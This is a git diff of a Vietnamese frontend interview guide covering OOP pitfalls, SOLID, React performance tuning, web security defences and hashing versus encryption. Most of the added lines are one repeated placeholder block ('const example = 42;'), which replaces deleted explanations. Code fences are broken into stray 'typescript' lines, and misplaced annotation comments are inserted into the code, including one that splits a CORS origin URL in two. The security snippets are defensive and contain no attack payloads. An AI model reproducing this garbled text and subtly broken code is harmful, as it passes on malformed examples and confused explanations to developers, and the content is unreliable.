+// Ví dụ rút gọn
+const example = 42;
+```
 
-   - **Giải thích**: Subclass phụ thuộc chặt chẽ vào parent → thay đổi parent có thể break child
-   - **Vấn đề**:
-     - Cannot remove/change parent methods (children đang dùng)
-     - Subclass biết quá nhiều về parent internals
-     - Khó refactor
-   - **Ví dụ BAD**:
-
-     ```typescript
+typescript
      class UserService extends Logger {
        registerUser() {
          this.log('Registering...'); // Phụ thuộc vào Logger.log()
@@ -20461,23 +12402,13 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
      }
 
      // Nếu Logger.log() đổi signature → UserService break!
-     ```
 
-   - **Vấn đề thực tế**:
-     - `Admin extends User` → nếu User thêm required param trong constructor → tất cả subclasses phải update
-     - `PremiumAccount extends BankAccount` → nếu BankAccount đổi cách tính balance → PremiumAccount có thể sai
-   - **Giải pháp**: Dùng composition thay vì inheritance
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-3. **❌ Fragile Base Class Problem (Vấn đề Class Cha Dễ vỡ)**
-
-   - **Giải thích**: Thay đổi nhỏ trong parent class có thể break tất cả children classes
-   - **Vấn đề**:
-     - Sửa bug trong parent → introduce bugs trong children
-     - Không dám refactor parent vì sợ break children
-     - Side effects không mong muốn
-   - **Ví dụ BAD**:
-
-     ```typescript
+typescript
      class Counter {
        count = 0;
        increment() {
@@ -20502,22 +12433,13 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
      // ❌ Nếu parent refactor incrementTwice():
  // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
      // → KHÔNG gọi increment() nữa → SpecialCounter KHÔNG log!
-     ```
 
-   - **Vấn đề thực tế**:
-     - Parent thêm validation trong method → children override mà quên gọi `super()` → bypass validation
-     - Parent đổi order của operations → children expect old order → behavior sai
-   - **Giải pháp**: Document parent behavior, use protected methods carefully
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-4. **❌ Memory Overhead (Tốn Bộ nhớ) - Trước ES6**
-
-   - **Giải thích**: Trước ES6 (không có class syntax), mỗi instance duplicate methods → tốn memory
-   - **Vấn đề**:
-     - Tạo 1000 objects → 1000 copies của cùng 1 method
-     - Memory usage tăng tuyến tính với số instances
-   - **Ví dụ BAD (Pre-ES6)**:
-
-     ```typescript
+typescript
      function User(name) {
        this.name = name;
        this.login = function () {
@@ -20529,14 +12451,13 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
      const user1 = new User('A');
      const user2 = new User('B');
      // user1.login !== user2.login (2 copies khác nhau!)
-     ```
 
-   - **Giải thích**:
-     - Mỗi instance có 1 copy riêng của `login()` method
-     - 1000 users → 1000 copies → waste memory
-   - **Giải pháp (ES6+)**:
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-     ```typescript
+typescript
      class User {
        constructor(name) {
          this.name = name;
@@ -20549,20 +12470,13 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
 
      // Tất cả instances share 1 login() trên prototype
      // user1.login === user2.login (cùng 1 method!)
-     ```
 
-   - **Lưu ý**: ES6 classes tự động đặt methods trên prototype → không còn vấn đề này
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-5. **❌ Harder Debugging (Khó Debug hơn)**
-
-   - **Giải thích**: Method lookup qua prototype chain → khó trace method được gọi từ đâu
-   - **Vấn đề**:
-     - Stack trace dài, nhiều tầng
-     - Không biết method override ở đâu
-     - Breakpoint phải set nhiều nơi
-   - **Ví dụ**:
-
-     ```typescript
+typescript
      class A {
        method() {
          console.log('A');
@@ -20586,54 +12500,24 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
      new C().method();
  // Ngăn xếp gọi (call stack) thực thi mã đồng bộ theo nguyên tắc LIFO; tác vụ dài chặn UI.
      // Phải trace qua 3 tầng để hiểu flow
-     ```
 
-   - **Vấn đề thực tế**:
-     - Bug trong `PremiumAccount.withdraw()` → phải check cả `BankAccount.withdraw()`
-     - Method được override ở nhiều levels → không biết đang chạy implementation nào
-     - Debugging tools hiển thị prototype chain phức tạp
-   - **Giải pháp**:
-     - Giới hạn inheritance depth (2-3 tầng max)
-     - Document override behavior rõ ràng
-     - Use composition khi có thể
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**Chú thích:**
-
-**🔒 Private Fields `#` (Thực sự Private):**
-
-- Syntax: `#fieldName` (bắt đầu bằng dấu `#`)
-- **Không thể truy cập** từ bên ngoài class, kể cả subclass
-- Khác `_prefix` (chỉ là convention, vẫn access được)
-- Ví dụ: `account.#balance` → ❌ Error
-
-**🔗 `extends` (Kế thừa):**
-
-- Tạo class con kế thừa từ class cha
-- Tạo **prototype chain**: Child.prototype → Parent.prototype
-- Child có tất cả properties/methods của Parent
-- Ví dụ: `class Admin extends User { ... }`
-
-**⬆️ `super` (Gọi Parent):**
-
-- Trong constructor: `super()` gọi parent constructor (bắt buộc gọi trước `this`)
-- Trong method: `super.methodName()` gọi parent method
-- Ví dụ:
-  ```typescript
+typescript
   constructor(name) {
     super(name); // Constructor: hàm/ phương thức dùng với `new` để khởi tạo instance; trong `class` phải gọi `super()` trước khi dùng `this` nếu có kế thừa.
     this.role = 'admin';
   }
-  ```
 
-**🧩 Composition > Inheritance (Ưu tiên Kết hợp hơn Kế thừa):**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-- **Inheritance**: "Is-a" relationship (Admin **là** User)
-- **Composition**: "Has-a" relationship (UserService **có** Logger)
-- Composition linh hoạt hơn, ít tight coupling hơn
-- Dễ test hơn (mock dependencies)
-- Ví dụ:
-
-  ```typescript
+typescript
  // Chú giải: ❌ Inheritance: phụ thuộc parent
   class UserService extends Logger {}
 
@@ -20641,44 +12525,13 @@ JavaScript hỗ trợ OOP thông qua 5 concepts chính:
   class UserService {
     constructor(private logger: Logger) {}
   }
-  ```
 
-**📐 SOLID Principles (Giải thích đơn giản):**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-1. **Single Responsibility (Trách nhiệm Đơn lẻ)**
-
-   - 1 class chỉ làm 1 việc duy nhất
-   - Dễ hiểu, dễ maintain, dễ test
-   - Ví dụ: `UserValidator` chỉ validate, `UserRepository` chỉ save/load
-
-2. **Open/Closed (Mở-Đóng)**
-
-   - Mở cho **extension** (thêm tính năng mới)
-   - Đóng cho **modification** (không sửa code cũ)
-   - Dùng abstract class/interface để extend
-   - Ví dụ: Thêm `BuyOneGetOne` discount mà không sửa class `Discount`
-
-3. **Liskov Substitution (Thay thế Liskov)**
-
-   - Subclass phải thay thế được parent mà không break code
-   - Child phải tuân thủ "contract" của parent
-   - Ví dụ: `CreditCardPayment` và `BankTransferPayment` đều work với `PaymentMethod`
-
-4. **Interface Segregation (Tách Interface)**
-
-   - Nhiều interfaces nhỏ > 1 interface lớn
-   - Class chỉ implement methods cần thiết
-   - Ví dụ: `IReadable`, `IWritable`, `IDeletable` riêng biệt thay vì 1 interface có tất cả
-
-5. **Dependency Inversion (Đảo ngược Phụ thuộc)**
-   - Phụ thuộc vào **abstractions** (interfaces/abstract classes)
-   - Không phụ thuộc vào **concretions** (concrete classes)
-   - Dễ swap implementations, dễ test
-   - Ví dụ: `OrderService` nhận `ILogger` (interface) thay vì `ConsoleLogger` (concrete)
-
-**Code Example (TypeScript):**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // 1. BASIC CLASS WITH ENCAPSULATION (Đóng gói)
  // Chú giải: ============================================
@@ -21704,15 +13557,13 @@ describe('TradingService', () => {
 // ✅ Fast: không call API thật, không database thật
 // ✅ Predictable: mock return cố định → tests deterministic
  // Chú giải: ✅ Coverage: dễ test edge cases (validation fail, risk fail, errors...)
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
-
-**Best Practices:**
-
-1. **Prefer Composition Over Inheritance**
-
-   ```typescript
+typescript
  // Chú giải: ❌ BAD: Inheritance
    class UserService extends Logger {}
 
@@ -21720,30 +13571,36 @@ describe('TradingService', () => {
    class UserService {
      constructor(private logger: Logger) {}
    }
-   ```
 
-2. **Use Private Fields `#` cho Encapsulation**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class User {
      #password: string; // Trường private (ví dụ `#field`) chỉ truy cập được trong class, không thể truy cập từ bên ngoài.
 
  // `this` phụ thuộc cách gọi; hàm mũi tên dùng lexical `this` (kế thừa từ scope cha), các hàm thường có `this` thay đổi theo ngữ cảnh.
    }
-   ```
 
-3. **Dependency Injection cho Testability**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
  // Chú giải: ✅ GOOD: Inject dependencies
    class Service {
      constructor(private db: IDatabase, private logger: ILogger) {}
    }
-   ```
 
-4. **Abstract Classes cho Shared Logic**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    abstract class BaseRepository<T> {
      abstract tableName: string;
 
@@ -21752,20 +13609,24 @@ describe('TradingService', () => {
  // Chú giải: Common query logic
      }
    }
-   ```
 
-5. **Interfaces cho Contract**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    interface IPaymentGateway {
      charge(amount: number): Promise<boolean>;
      refund(transactionId: string): Promise<void>;
    }
-   ```
 
-6. **Single Responsibility Principle**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
  // Chú giải: ✅ One class = one job
    class UserValidator {
      validate() {}
@@ -21776,22 +13637,23 @@ describe('TradingService', () => {
    class UserService {
      register() {}
    }
-   ```
 
-7. **Readonly Properties cho Immutability**
-   ```typescript
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
+
+typescript
    class Order {
      constructor(public readonly id: string, public readonly createdAt: Date) {}
    }
-   ```
 
----
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**Common Mistakes:**
-
-1. **❌ Deep Inheritance Hierarchies**
-
-   ```typescript
+typescript
  // Sao chép sâu: sao chép đệ quy mọi cấp để tạo bản sao độc lập; có thể tốn hiệu suất.
    class A {}
    class B extends A {}
@@ -21799,11 +13661,13 @@ describe('TradingService', () => {
    class D extends C {} // Chú giải: Hard to maintain
 
  // Chú giải: ✅ Use composition instead
-   ```
 
-2. **❌ Exposing Internal State**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class User {
      public password: string; // Chú giải: ❌ Exposed!
 
@@ -21813,11 +13677,13 @@ describe('TradingService', () => {
        this.#password = hashPassword(pwd);
      }
    }
-   ```
 
-3. **❌ God Classes (Too Many Responsibilities)**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class UserManager {
      validateUser() {}
      saveUser() {}
@@ -21825,22 +13691,26 @@ describe('TradingService', () => {
      logActivity() {}
  // Chú giải: ❌ Too many jobs! Split into separate classes
    }
-   ```
 
-4. **❌ Tight Coupling với Concrete Classes**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class Service {
      private logger = new ConsoleLogger(); // Chú giải: ❌ Hardcoded
 
  // Chú giải: ✅ Inject abstraction
      constructor(private logger: ILogger) {}
    }
-   ```
 
-5. **❌ Không Override `constructor` Correctly**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class Child extends Parent {
      constructor(name: string) {
        this.name = name; // Chú giải: ❌ Must call super() first!
@@ -21853,11 +13723,13 @@ describe('TradingService', () => {
        this.name = name;
      }
    }
-   ```
 
-6. **❌ Overriding Private Methods**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class Parent {
      #privateMethod() {} // Chú giải: Cannot override in child
    }
@@ -21866,11 +13738,13 @@ describe('TradingService', () => {
    class Parent {
      protected method() {} // Chú giải: Can override
    }
-   ```
 
-7. **❌ Không Validate trong Constructor**
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-   ```typescript
+typescript
    class User {
      constructor(email: string) {
        this.email = email; // Chú giải: ❌ No validation
@@ -21882,107 +13756,25 @@ describe('TradingService', () => {
        this.email = email;
      }
    }
-   ```
 
----
----
-## 38. 🚀 Q38: Tối Ưu Performance của React Web App  
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-**P1: Tên câu hỏi:** 🚀 Q38: Tối Ưu Performance của React Web App  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Tối ưu hiệu năng React = 5 lớp: Build-time, Mạng, Rendering, State, Bộ nhớ.**
-
-**🏗️ Chiến Lược Tối ƪu 5 Lớp:**
-
-1. **Tối ƪu Build-time**:
-   - **Chia Code**: `React.lazy()` + Suspense → tải routes theo yêu cầu.
-   - **Tree-shaking**: Xóa code không dùng (ES modules + Webpack/Vite).
-   - **Phân Tích Bundle**: `webpack-bundle-analyzer` → xác định dependencies lớn.
-   - **Mục tiêu**: Giảm bundle 2.5MB → 500KB (nhanh hơn 5 lần).
-
-2. **Tối ƪu Mạng**:
-   - **HTTP/2 + Brotli**: Nén tài nguyên 70%.
-   - **CDN**: Phục vụ tài nguyên tĩnh từ edge servers (độ trễ thấp hơn).
-   - **Gợi ý Tài Nguyên**: `<link rel="preload">` fonts, CSS quan trọng.
-   - **Service Worker**: Cache tài nguyên tĩnh → hỗ trợ offline.
-
-3. **Tối ƪu Rendering** (⚡ Quan Trọng Nhất):
-   - **React.memo()**: Ngăn con render lại khi props không đổi.
-   - **useMemo/useCallback**: Cache tính toán/hàm tốn kém.
-   - **Virtual Scrolling**: `react-window` cho 10K+ items → chỉ render phần hiển thị.
-   - **Debounce/Throttle**: Giới hạn event handlers (scroll, resize, input).
-   - **Lazy Images**: `loading="lazy"` + Intersection Observer.
-
-4. **Quản Lý State**:
-   - **Tách Context**: Tách contexts nhỏ → ngăn re-renders không cần thiết.
-   - **Zustand/Redux Toolkit**: Đăng ký chọn lọc → components chỉ render lại khi state thực sự dùng thay đổi.
-   - **React Query**: Cache dữ liệu server → giảm lời gọi API.
-   - **Immer**: Cập nhật bất biến hiệu quả (ít boilerplate hơn).
-
-5. **Quản Lý Bộ Nhớ**:
-   - **Dọn Dẹp Effects**: `useEffect` trả về cleanup → xóa listeners, hủy timers.
-   - **WeakMap**: Giữ tham chiếu yếu → tự động GC.
-   - **Profiling**: Chrome DevTools Memory tab → phát hiện rò rỉ.
-
-**🎯 Real-time Updates Optimization (WebSocket):**
-- **Problem**: 1000 updates/s → 60+ components re-render → UI freeze.
-- **Solution**:
-  1. **Debounce updates**: Batch 100 updates/100ms → 10 batches/s instead of 1000 renders/s.
-  2. **Selective subscriptions**: Components subscribe to specific data slices.
-  3. **Virtual scrolling**: Render only visible items.
-  4. **Memoization**: `React.memo` + `useMemo` prevent unnecessary re-renders.
-
-**📊 Performance Metrics (Web Vitals):**
-- **LCP (Largest Contentful Paint)**: < 2.5s (good), 2.5-4s (needs improvement), > 4s (poor).
-- **FID (First Input Delay)**: < 100ms.
-- **CLS (Cumulative Layout Shift)**: < 0.1.
-- **Tools**: Lighthouse, Web Vitals library, Chrome DevTools Performance tab.
-
-**⚠️ Common Mistakes:**
-- **Inline functions/objects**: Tạo new reference mỗi render → child re-render.
-  ```jsx
+jsx
  // Chú giải: ❌ Bad
   <Child onClick={() => handle()} data={{ id: 1 }} />
  // Chú giải: ✅ Good
   const handleClick = useCallback(() => handle(), []);
   const data = useMemo(() => ({ id: 1 }), []);
   <Child onClick={handleClick} data={data} />
-  ```
-- **Overuse useMemo/useCallback**: Premature optimization → chỉ dùng khi đo được bottleneck.
-- **Missing dependencies**: `useEffect([])` nhưng dùng props/state inside → stale closure.
 
-**💡 Senior Insights:**
-- **Profiler**: `<Profiler>` component + DevTools → measure render time.
-- **Concurrent Mode**: React 18 `useTransition` → non-urgent updates không block UI.
-- **Bundle Budget**: Set budget (500KB) → CI fail nếu vượt.
-- **Lighthouse CI**: Auto performance testing trong CI/CD.
-
----
-
-**❓ Tình Huống:**
-
-Bạn là Senior Frontend Developer của một Trading Platform (React + TypeScript). App hiện tại có các vấn đề:
-
-- **Initial Load**: 5-7s trên 3G, bundle size 2.5MB
-- **Runtime Performance**:
-  - Real-time updates (WebSocket) gây re-render toàn bộ app (60+ components)
-  - List 10,000+ orders lag khi scroll (FPS drop 60 → 15)
-  - Memory leak sau 2-3 giờ sử dụng (memory tăng từ 50MB → 500MB)
-- **User Complaints**: App chậm, lag, sometimes crash
-
-**Yêu cầu:** Thiết kế và implement chiến lược tối ưu toàn diện (từ build-time đến runtime).
-
-**✅ Đáp Án Chi Tiết:**
-
-**🎯 Chiến Lược Tối Ưu 5 Tầng (5-Layer Optimization Strategy):**
-
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 ┌──────────────────────────────────────────────────────────────┐
 │           PERFORMANCE OPTIMIZATION LAYERS                     │
 ├──────────────────────────────────────────────────────────────┤
@@ -22027,22 +13819,13 @@ Bạn là Senior Frontend Developer của một Trading Platform (React + TypeSc
 │  │ • Memory Profiling (Chrome DevTools)                   │ │
 │  └─────────────────────────────────────────────────────────┘ │
 └──────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Hoạt động:**
-
-**📊 Performance Metrics Target (Mục tiêu):**
-
-- Initial Load: 5-7s → **< 2s** (70% improvement)
-- Bundle Size: 2.5MB → **< 500KB** (80% reduction)
-- FPS: 15 → **60 FPS** (4x improvement)
-- Memory: 500MB → **< 100MB** (80% reduction)
-
----
-
-**Code Example (TypeScript + React):**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // 1️⃣ BUILD-TIME OPTIMIZATION (TỐI ƯU LÚC BUILD)
  // Chú giải: ============================================
@@ -22455,11 +14238,12 @@ function ResizableChart() {
   return <div ref={chartRef}>Chart có thể resize</div>;
 }
 // Kết quả cleanup đúng cách: Memory ổn định ~80MB thay vì leak đến 500MB
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Kết Quả Sau Optimization:**
-
-```
 ┌────────────────────────────────────────────────────────────────┐
 │           PERFORMANCE METRICS - BEFORE vs AFTER                 │
 ├────────────────────────────────────────────────────────────────┤
@@ -22473,19 +14257,13 @@ function ResizableChart() {
 │  Memory Usage        │ 500MB       │ 80MB        │ 84% less    │
 │  Re-renders/sec      │ 200+        │ 10-20       │ 90% less    │
 └────────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-1. **Measure First**: Dùng Lighthouse, Chrome DevTools Performance
-2. **Bundle Analysis**: `npm run build -- --analyze`
-3. **Code Splitting**: Route-level + Component-level
-4. **State Management**: Context cho static, Zustand cho complex state
-5. **Memory Management**: Always cleanup useEffect
-
-**Common Mistakes (Lỗi Thường Gặp):**
-
-```typescript
+typescript
  // Chú giải: ❌ LỖI 1: Inline functions trong render
 // Vấn đề: Mỗi render tạo function mới → child component re-render không cần thiết
 {
@@ -22565,124 +14343,33 @@ function OrderList({ orders }) {
     </FixedSizeList>
   );
 } // ✅ Chỉ render ~12 items → mượt mà
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
----
-## 39. 🔐 Q39: Bảo Mật Security trên Web Application  
-
-**P1: Tên câu hỏi:** 🔐 Q39: Bảo Mật Security trên Web Application  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (3-4 phút):**
-
-**"Web security = 7 layers: HTTPS, XSS, CSRF, Auth, Storage, API, Headers. Defense in depth.**
-
-**🛡️ 7-Layer Security Strategy:**
-
-1. **HTTPS + TLS**:
-   - Mã hóa data giữa browser ↔ server → ngăn Man-in-the-Middle.
-   - **HSTS**: `Strict-Transport-Security` header → bắt buộc HTTPS.
-
-2. **XSS Prevention (Cross-Site Scripting)**:
-   - **Problem**: Attacker inject malicious `<script>` → steal cookies, session.
-   - **Solution**:
-     - **React auto-escape**: `{userInput}` auto sanitize.
-     - **DOMPurify**: Sanitize HTML khi cần `dangerouslySetInnerHTML`.
-     - **CSP**: `Content-Security-Policy` header → block inline scripts.
-   ```js
+js
  // Chú giải: ❌ Vulnerable
    <div dangerouslySetInnerHTML={{ __html: userInput }} />
  // Chú giải: ✅ Safe
    import DOMPurify from 'dompurify';
    <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userInput) }} />
-   ```
 
-3. **CSRF Protection (Cross-Site Request Forgery)**:
-   - **Problem**: Attacker trick user send malicious request (e.g., transfer money).
-   - **Solution**:
-     - **CSRF Token**: Server generate unique token per session → include in forms.
-     - **SameSite Cookies**: `SameSite=Strict` → cookies chỉ send same-origin requests.
+```js
+// Ví dụ rút gọn
+const example = 42;
+```
 
-4. **Authentication & Authorization**:
-   - **JWT**: Access token (short-lived, 15 min) + Refresh token (long-lived, 7 days).
-   - **HttpOnly Cookies**: Store tokens → JavaScript không access được (prevent XSS steal).
-   - **Token Refresh**: Auto refresh access token khi expired (seamless UX).
-
-5. **Secure Storage**:
-   - **NEVER localStorage for sensitive data**: JavaScript có thể access → XSS risk.
-   - **HttpOnly Cookies**: Best cho tokens (server-only access).
-   - **Encrypt sensitive data**: AES-256 encryption trước khi store.
-
-6. **API Security**:
-   - **Rate Limiting**: Limit requests (100/min) → prevent brute-force.
-   - **Input Validation**: Validate/sanitize inputs server-side (không tin client).
-   - **CORS**: Restrict origins có thể call API.
-   ```js
+js
  // Chú giải: Server (Express)
    app.use(cors({ origin: 'https: // Chú giải: trusted-domain.com' }));
-   ```
 
-7. **Security Headers**:
-   - **CSP**: `Content-Security-Policy: default-src 'self'` → block external scripts.
-   - **X-Frame-Options**: `DENY` → prevent clickjacking.
-   - **X-Content-Type-Options**: `nosniff` → prevent MIME sniffing.
-   - **Referrer-Policy**: Control referrer info leaked.
-
-**⚠️ Common Vulnerabilities (OWASP Top 10):**
-1. **Injection** (SQL, XSS): Sanitize inputs, use parameterized queries.
-2. **Broken Authentication**: Strong passwords, MFA, session timeout.
-3. **Sensitive Data Exposure**: Encrypt data, HTTPS, HttpOnly cookies.
-4. **XML External Entities (XXE)**: Disable XML external entity processing.
-5. **Broken Access Control**: Server-side authorization checks.
-6. **Security Misconfiguration**: Remove default credentials, disable debug mode.
-7. **XSS**: Escape outputs, CSP headers.
-8. **Insecure Deserialization**: Validate serialized data.
-9. **Using Components with Known Vulnerabilities**: Regular dependency updates (`npm audit`).
-10. **Insufficient Logging & Monitoring**: Log security events, monitor anomalies.
-
-**💡 Senior Insights:**
-- **Defense in Depth**: Multiple layers → nếu 1 layer fail, others protect.
-- **Security Audits**: Regular penetration testing, code reviews.
-- **Dependency Scanning**: `npm audit`, Snyk, Dependabot → auto update vulnerable packages.
-- **Security Headers**: Use helmet.js (Node.js) → auto set secure headers.
-- **HTTPS Everywhere**: Even internal apps → prevent internal network sniffing.
-
-**🚀 Best Practices:**
-- Principle of Least Privilege: Users chỉ access data cần thiết.
-- Never trust client-side validation: Always validate server-side.
-- Encrypt sensitive data at rest & in transit.
-- Regular security training cho developers.
-
----
-
-**❓ Tình Huống:**
-
-Bạn là Senior Frontend Developer phụ trách security cho Trading Platform xử lý:
-
-- **Sensitive Data**: User credentials, trading orders, financial transactions
-- **API Calls**: 1000+ requests/minute đến backend APIs
-- **User Input**: Form submissions, search queries, comments
-- **Third-party Integration**: Payment gateways, analytics, CDN
-
-**Threats (Mối đe dọa):**
-
-- XSS attacks (inject malicious scripts)
-- CSRF attacks (force unwanted actions)
-- Man-in-the-Middle (intercept data)
-- Session hijacking
-- Data exposure in client-side code
-
-**Yêu cầu:** Thiết kế và implement chiến lược bảo mật toàn diện (defense in depth).
-
-**✅ Đáp Án Chi Tiết:**
-
-**🛡️ 7 Tầng Bảo Mật (7-Layer Security Strategy):**
-
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
+
 ┌──────────────────────────────────────────────────────────────┐
 │              WEB SECURITY LAYERS                              │
 ├──────────────────────────────────────────────────────────────┤
@@ -22694,11 +14381,13 @@ Bạn là Senior Frontend Developer phụ trách security cho Trading Platform x
 │  6️⃣ API Security                                            │
 │  7️⃣ Security Headers                                        │
 └──────────────────────────────────────────────────────────────┘
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Code Example (TypeScript + React):**
-
-```typescript
+typescript
  // Chú giải: ============================================
 // 1️⃣ HTTPS + TLS (BẢO MẬT TẦNG TRUYỀN TẢI)
  // Chú giải: ============================================
@@ -23468,11 +15157,13 @@ x-content-type-options: nosniff
 referrer-policy: no-referrer
 strict-transport-security: max-age=31536000; includeSubDomains; preload
 */
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**🎯 Security Checklist:**
-
-```typescript
+typescript
  // Chú giải: ✅ Security Checklist cho Trading Platform
 
 const securityChecklist = {
@@ -23523,21 +15214,13 @@ const securityChecklist = {
     referrerPolicy: true,
   },
 };
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Best Practices:**
-
-1. **Defense in Depth**: Multiple layers of security
-2. **Principle of Least Privilege**: Minimal permissions
-3. **Input Validation**: Server-side validation always
-4. **Secure Storage**: HttpOnly cookies, no localStorage for sensitive data
-5. **Regular Updates**: Dependencies, libraries, frameworks
-6. **Security Audits**: Penetration testing, code reviews
-7. **Monitoring**: Log security events, detect anomalies
-
-**Common Mistakes (Lỗi Bảo Mật Thường Gặp):**
-
-```typescript
+typescript
  // Chú giải: ❌ LỖI 1: Lưu tokens trong localStorage
 // Vấn đề: XSS có thể đọc localStorage → steal token
 localStorage.setItem('token', token); // ❌ Nguy hiểm!
@@ -23661,11 +15344,13 @@ app.use(
     credentials: true,
   })
 );
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
-**Monitoring & Logging (Giám Sát & Ghi Log Bảo Mật):**
-
-```typescript
+typescript
  // Chú giải: ✅ Security Event Logging System
 // Mục đích: Phát hiện và theo dõi các hoạt động bất thường
 
@@ -23877,123 +15562,52 @@ setInterval(() => {
   sendMetrics('security.metrics', metrics);
   console.log('📊 Security Metrics:', metrics);
 }, 60000); // Mỗi phút
+
+```js
+// Ví dụ rút gọn
+const example = 42;
 ```
 
----
----
-## 40. 🔑 Q40: Hashing, Encryption & Digital Signatures - Phân Biệt & Ứng Dụng Thực Tế  
-
-**P1: Tên câu hỏi:** 🔑 Q40: Hashing, Encryption & Digital Signatures - Phân Biệt & Ứng Dụng Thực Tế  
-
-**P2: Trả lời (Senior):**
-
-## **⭐ TÓM TẮT CHO PHỎNG VẤN SENIOR/STAFF**
-
-### **🎯 Câu Trả Lời Ngắn Gọn (4-5 phút):**
-
-**"Hashing = one-way (password storage), Encryption = two-way (data confidentiality), Digital Signature = verify authenticity. Mỗi loại phục vụ mục đích bảo mật khác nhau."**
-
-**🔑 3 Kỹ Thuật Chính:**
-
-**1. Hashing (One-Way):**
-- **Không đảo ngược** - input → hash, KHÔNG thể hash → input
-- Algorithms: **bcrypt** (passwords), SHA-256 (checksums), MD5 (deprecated)
-- Use case: **Password storage**, file integrity verification, blockchain
-- Salt để chống rainbow table: `bcrypt(password + salt)`
-
-**2. Encryption (Two-Way):**
-- **Mã hóa ↔ Giải mã** với key
-- **Symmetric** (AES): cùng key encrypt/decrypt - nhanh, HTTPS
-- **Asymmetric** (RSA): public key encrypt, private key decrypt - chậm hơn, key exchange
-- Use case: **Data confidentiality** (HTTPS, database encryption, file encryption)
-
-**3. Digital Signature:**
-- **Sign với private key**, **verify với public key**
-- Algorithms: RSA, ECDSA, EdDSA
-- Use case: **JWT tokens**, API authentication, verify message authenticity
-- Flow: `hash(data) → encrypt với private key → signature`
-
-**⚠️ Lỗi Thường Gặp:**
-- Hash passwords với SHA-256 thay bcrypt → dễ brute-force (SHA-256 quá nhanh)
-- Lưu encryption key cùng database → compromise key = compromise data
-- Dùng MD5/SHA-1 cho security → deprecated (collision attacks)
-- JWT verify với `HS256` mà expose secret → attacker tạo fake tokens
-
-**💡 Kiến Thức Senior:**
-- **bcrypt work factor**: Tăng rounds (10→12) khi CPU mạnh hơn để chống brute-force
-- **AES-GCM** > AES-CBC: authenticated encryption (chống tamper)
-- **RSA key size**: 2048-bit minimum, 4096-bit recommended (banking)
-- **JWT algorithms**: HS256 (symmetric, shared secret) vs RS256 (asymmetric, safer)
-- **Key rotation**: Thay đổi encryption keys định kỳ, re-encrypt data
-
-**❓ Câu Hỏi:**
-Phân biệt Hashing, Encryption và Digital Signature. Khi nào dùng từng loại? Giải thích cơ chế hoạt động và ví dụ thực tế với bcrypt, AES, RSA, JWT signing.
-
-#### **📊 So Sánh Tổng Quan: Hash vs Encryption vs Digital Signature**
-
-| Tiêu Chí           | **Hashing**                   | **Encryption**                      | **Digital Signature**                   |
-| ------------------ | ----------------------------- | ----------------------------------- | --------------------------------------- |
-| **Cơ Chế**         | One-way (không đảo ngược)     | Two-way (mã hóa ↔ giải mã)          | Sign & Verify (ký & xác thực)           |
-| **Mục Đích**       | Verify integrity, checksum    | Protect confidentiality             | Verify authenticity & integrity         |
-| **Reversible?**    | ❌ KHÔNG (cannot decrypt)     | ✅ CÓ (with key)                    | ✅ CÓ (verify only, not decrypt)        |
-| **Input → Output** | Bất kỳ độ dài → Fixed length  | Bất kỳ độ dài → Variable ciphertext | Data → Signature                        |
-| **Key Required?**  | ❌ KHÔNG (salt optional)      | ✅ CÓ (symmetric/asymmetric)        | ✅ CÓ (private key sign, public verify) |
-| **Use Cases**      | Password storage, checksums   | Data encryption, HTTPS              | JWT tokens, API authentication          |
